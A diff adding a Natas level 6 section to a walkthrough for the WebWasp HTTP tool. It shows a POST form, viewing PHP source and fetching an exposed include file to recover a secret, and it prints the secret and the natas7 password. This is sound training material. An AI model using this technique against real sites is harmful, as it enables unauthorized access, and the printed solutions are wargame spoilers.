@@ -16,7 +16,8 @@ The intent for this walkthrough is to demonstrate WebWasp's abilities in a "real
 - [Level 3](#level-3) (robots.txt)
 - [Level 4](#level-4) (The referer header)
 - [Level 5](#level-5) (Cookies! 🍪)
-- [Level 6](#level-6)
+- [Level 6](#level-6) (Our first POST request)
+- [Level 7](#level-7) 
 
 ## Level 0
 
@@ -601,6 +602,390 @@ Boom! We've successfully passed our custom-baked cookie to satisfy the site's re
 Save the password into `pass6` and we'll press on!
 
 # Level 6
+
+Before making our get request to level 6, let's clear our cookie from last level:
+
+```
+> cookies remove loggedin
+[🍪] Removed cookie:
+   'loggedin'
+```
+or
+```
+> cookies clear
+[🍪] Stored cookies cleared
+```
+
+Now let's update the auth headers and make the next request:
+
+```HTML
+<html>
+<head>
+-- truncated --
+</head>
+<body>
+<h1>natas6</h1>
+<div id="content">
+
+
+<form method=post>
+Input secret: <input name=secret><br>
+<input type=submit name=submit>
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+A couple new things to notice in this level's source. First, we see there's a form here:
+
+```HTML
+<form method=post>
+Input secret: <input name=secret><br>
+<input type=submit name=submit>
+</form>
+```
+
+Secondly, we see there's a link just below it:
+
+```HTML
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+The form enables a user to fill out some input and submit is using an HTTP POST request.
+
+We can interact with this form by using a feature of WebWasp we haven't seen yet in this walkthrough: The `post` command!
+
+Let's take a look at this usage of `post`:
+
+```
+> post -h
+usage: post [-h] url [params [params ...]]
+
+Send an HTTP POST request to a server/url
+
+positional arguments:
+  url         The url to make a request to
+  params      Parameters from params to send with post request
+
+optional arguments:
+  -h, --help  Show this help message
+```
+
+The syntax here is similar to that of the `get` command we've been using, in that we supply a URL to operate against.
+
+The `params` argument within the `post` command is where the difference lies. We first need to create `params` with given values using the `params` command, then pass those into the `post` command to form a succinct POST request.
+
+But what parameters do we need to supply? Let's look again at the form:
+
+```HTML
+<form method=post>
+Input secret: <input name=secret><br>
+<input type=submit name=submit>
+</form>
+```
+
+For starters, we one input field:
+
+```HTML
+Input secret: <input name=secret>
+```
+
+The `name=secret` tag here indicates the parameter name we need to supply in the POST request. Let's make that now with a random value:
+
+```
+> params add secret "random"
+[🐝] Added param:
+   'secret' : 'random'
+```
+
+The other field in this form is here:
+
+```HTML
+<input type=submit name=submit>
+```
+
+From the tag `type=submit`, we know this is a button to actually perform the submittal of the form. And from the `name=submit` tag, we know this field is also named `submit`.
+
+For HTML forms, so long as the a `type=submit` field gets any kind of value, the form will submit. Let's add that now:
+
+```
+> params add submit "any"
+[🐝] Added param:
+   'submit' : 'any'
+```
+
+Now let's try to make a POST request. Following the syntax of the `post` command, we provide the URL, and then the parameter names we added that we want to submit along with the request:
+
+```
+> post http://natas6.natas.labs.overthewire.org/ secret submit
+[🐝] Sending POST request to http://natas6.natas.labs.overthewire.org/...
+POST request made with parameters:
+   'secret' : 'random'
+   'submit' : 'any'
+[🐝] POST request completed. Status code: 200 (OK)
+[🐝] Response captured! Type 'response show' for summary
+```
+
+Let's see the response!
+
+```HTML
+<html>
+<head>
+-- truncated --
+</head>
+<body>
+<h1>natas6</h1>
+<div id="content">
+
+Wrong secret
+<form method=post>
+Input secret: <input name=secret><br>
+<input type=submit name=submit>
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Welp, look's like our post request submitted! But we submitted the wrong secret. This isn't surprising since we just put a random value in as the `secret` parameter.
+
+Let's take a look at that link and maybe that will shed some light as to what we may need to enter as the secret:
+
+Note that we specify the `--no-params` flag along with our get request, since we don't want to send along those parameters we just created.
+
+```
+> get http://natas6.natas.labs.overthewire.org/index-source.html --no-params
+[🐝] Sending GET request to http://natas6.natas.labs.overthewire.org/index-source.html...
+[🐝] GET request completed. Status code: 200 (OK)
+[🐝] Response captured! Type 'response show' for summary
+```
+
+and we get...
+
+```HTML
+> resp show -t
+<code><span style="color: #000000">
+&lt;html&gt;<br />&lt;head&gt;<br />&lt;!--&nbsp;This&nbsp;stuff&nbsp;in&nbsp;the&nbsp;header&nbsp;has&nbsp;nothing&nbsp;to&nbsp;do&nbsp;with&nbsp;the&nbsp;level&nbsp;--&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;type="text/css"&nbsp;href="http://natas.labs.overthewire.org/css/level.css"&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;href="http://natas.labs.overthewire.org/css/jquery-ui.css"&nbsp;/&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;href="http://natas.labs.overthewire.org/css/wechall.css"&nbsp;/&gt;<br />&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"&gt;&lt;/script&gt;<br />&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/jquery-ui.js"&gt;&lt;/script&gt;<br />&lt;script&nbsp;src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/wechall.js"&gt;&lt;/script&gt;<br />&lt;script&gt;var&nbsp;wechallinfo&nbsp;=&nbsp;{&nbsp;"level":&nbsp;"natas6",&nbsp;"pass":&nbsp;"&lt;censored&gt;"&nbsp;};&lt;/script&gt;&lt;/head&gt;<br />&lt;body&gt;<br />&lt;h1&gt;natas6&lt;/h1&gt;<br />&lt;div&nbsp;id="content"&gt;<br /><br /><span style="color: #0000BB">&lt;?<br /><br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">"includes/secret.inc"</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">array_key_exists</span><span style="color: #007700">(</span><span style="color: #DD0000">"submit"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">$secret&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">[</span><span style="color: #DD0000">'secret'</span><span style="color: #007700">])&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">"Access&nbsp;granted.&nbsp;The&nbsp;password&nbsp;for&nbsp;natas7&nbsp;is&nbsp;&lt;censored&gt;"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">"Wrong&nbsp;secret"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /></span><span style="color: #0000BB">?&gt;<br /></span><br />&lt;form&nbsp;method=post&gt;<br />Input&nbsp;secret:&nbsp;&lt;input&nbsp;name=secret&gt;&lt;br&gt;<br />&lt;input&nbsp;type=submit&nbsp;name=submit&gt;<br />&lt;/form&gt;<br /><br />&lt;div&nbsp;id="viewsource"&gt;&lt;a&nbsp;href="index-source.html"&gt;View&nbsp;sourcecode&lt;/a&gt;&lt;/div&gt;<br />&lt;/div&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br /></span>
+</code>
+```
+
+...oh boy. That doesn't look very pleasant. This is a classic example of source that doesn't decode HTML entities.
+
+HTML entities are those freaky looking things throughout the above response that start with an `&` and end with a `;`. Typically these are decoded for us by the server, but it looks like we're viewing some raw source.
+
+Not to worry! We can use WebWasp's `beautify` feature to make this look a little nicer:
+
+```
+> response beautify 
+[🐝] Beautifying response text...
+   Ran prettify.
+   Made 174 entity decodes.
+```
+
+Let's take a look now:
+
+```HTML
+> response show -t
+<code>
+ <span style="color: #000000">
+  <html>
+   <br/>
+   <head>
+    --truncated --
+   </head>
+   <br/>
+   <body>
+    <br/>
+    <h1>
+     natas6
+    </h1>
+    <br/>
+    <div id="content">
+     <br/>
+     <br/>
+     <span style="color: #0000BB">
+      <?<br />
+      <br/>
+     </span>
+     <span style="color: #007700">
+      include
+     </span>
+     <span style="color: #DD0000">
+      "includes/secret.inc"
+     </span>
+     <span style="color: #007700">
+      ;
+      <br/>
+      <br/>
+      if(
+     </span>
+     <span style="color: #0000BB">
+      array_key_exists
+     </span>
+     <span style="color: #007700">
+      (
+     </span>
+     <span style="color: #DD0000">
+      "submit"
+     </span>
+     <span style="color: #007700">
+      ,
+     </span>
+     <span style="color: #0000BB">
+      $_POST
+     </span>
+     <span style="color: #007700">
+      )) {
+      <br/>
+      if(
+     </span>
+     <span style="color: #0000BB">
+      $secret
+     </span>
+     <span style="color: #007700">
+      ==
+     </span>
+     <span style="color: #0000BB">
+      $_POST
+     </span>
+     <span style="color: #007700">
+      [
+     </span>
+     <span style="color: #DD0000">
+      'secret'
+     </span>
+     <span style="color: #007700">
+      ]) {
+      <br/>
+      print
+     </span>
+     <span style="color: #DD0000">
+      "Access granted. The password for natas7 is
+      <censored>
+       "
+      </censored>
+     </span>
+     <span style="color: #007700">
+      ;
+      <br/>
+      } else {
+      <br/>
+      print
+     </span>
+     <span style="color: #DD0000">
+      "Wrong secret"
+     </span>
+     <span style="color: #007700">
+      ;
+      <br/>
+      }
+      <br/>
+      }
+      <br/>
+     </span>
+     <span style="color: #0000BB">
+      ?&gt;
+      <br/>
+     </span>
+     <br/>
+     <form method="post">
+      <br/>
+      Input secret:
+      <input name="secret"/>
+      <br/>
+      <br>
+       <input name="submit" type="submit"/>
+       <br/>
+      </br>
+     </form>
+     <br/>
+     <br/>
+     <div id="viewsource">
+      <a href="index-source.html">
+       View sourcecode
+      </a>
+     </div>
+     <br/>
+    </div>
+    <br/>
+   </body>
+   <br/>
+  </html>
+  <br/>
+ </span>
+</code>
+```
+
+Definitely much more readable now. Taking a closer inspection of the source, it looks like it's using `php` to include a file: `includes/secret.inc`.
+
+It's then comparing the field `secret` from that file to the field `secret` that we submitted with our post request.
+
+So let's take a look at that file!
+
+```
+> get http://natas6.natas.labs.overthewire.org/includes/secret.inc --no-params
+[🐝] Sending GET request to http://natas6.natas.labs.overthewire.org/includes/secret.inc...
+[🐝] GET request completed. Status code: 200 (OK)
+[🐝] Response captured! Type 'response show' for summary
+```
+```PHP
+> resp show -t
+<?
+$secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+```
+
+Easy enough! Let's edit our parameter to match this secret value:
+
+```
+> params add secret FOEIUWGHFEEUHOFUOIU
+[🐝] Added param:
+   'secret' : 'FOEIUWGHFEEUHOFUOIU'
+```
+
+Now let's try to POST again!
+
+```
+> post http://natas6.natas.labs.overthewire.org/ secret submit                
+[🐝] Sending POST request to http://natas6.natas.labs.overthewire.org/...
+POST request made with parameters:
+   'secret' : 'FOEIUWGHFEEUHOFUOIU'
+   'submit' : 'any'
+[🐝] POST request completed. Status code: 200 (OK)
+[🐝] Response captured! Type 'response show' for summary
+```
+```HTML
+> resp show -t
+<html>
+<head>
+-- truncated --
+</head>
+<body>
+<h1>natas6</h1>
+<div id="content">
+
+Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
+<form method=post>
+Input secret: <input name=secret><br>
+<input type=submit name=submit>
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+And there we go! We provided the right value for the `secret` field of the POST request, and it gave us the password!
+
+Let's store it in `pass7` and continue.
+
+## Level 7
 
 ---
 
